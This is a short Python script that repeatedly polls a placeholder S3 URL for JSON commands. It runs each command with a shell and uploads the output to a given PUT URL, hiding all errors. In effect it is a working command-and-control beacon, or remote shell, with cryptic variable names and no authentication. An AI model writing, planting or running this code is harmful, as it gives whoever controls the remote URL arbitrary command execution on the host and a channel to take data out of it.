import subprocess,json,time,os
U='__S3_POLL_URL_PLACEHOLDER__'
S='__SESSION_ID_PLACEHOLDER__'
P=int(os.environ.get('S3_POLL_INTERVAL','5'))
n=0
def g(u):
    try:
        r=subprocess.run(['curl','-s','-f','--max-time','10',u],capture_output=True,text=True,timeout=15)
        if r.returncode==0:return r.stdout
    except:pass
def p(u,d):
    try:
        r=subprocess.run(['curl','-s','-f','--max-time','30','-X','PUT','-H','Content-Type: text/plain','--data-binary',d,u],capture_output=True,text=True,timeout=35)
        return r.returncode==0
    except:pass
def x(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
        return(r.stdout+r.stderr)or'(empty)'
    except:return'error'
while 1:
    try:
        b=g(U)
        if b:
            o=json.loads(b)
            if o.get('cmd'):
                q,c,ru=o.get('seq',0),o['cmd'],o.get('response_put_url')
                if q>n:
                    out=x(c);n=q
                    if ru:p(ru,out)
        time.sleep(P)
    except KeyboardInterrupt:break
    except:time.sleep(P)